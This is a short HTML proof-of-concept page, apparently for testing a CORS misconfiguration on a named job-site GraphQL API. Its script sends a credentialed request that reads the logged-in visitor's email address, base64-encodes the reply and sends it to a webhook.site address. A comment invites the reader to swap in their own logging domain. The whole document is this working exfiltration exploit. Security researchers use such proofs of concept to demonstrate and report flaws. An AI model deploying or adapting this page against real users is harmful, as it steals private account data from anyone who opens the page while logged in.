<!DOCTYPE html>
<html>
  <body>
    <script>
      fetch("https://apis.indeed.com/graphql", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        credentials: "include",
        mode: "cors",
        body: JSON.stringify({
          query: "{ viewer { email } }"
        })
      })
      .then(response => response.text())
      .then(data => {
        // Replace this with your webhook or logging domain
        fetch("https://webhook.site/133897bf-8640-4cd7-80dd-5561335f708e?data=" + btoa(data));
      })
      .catch(console.error);
    </script>
    <h1>CORS PoC Testing</h1>
  </body>
</html>
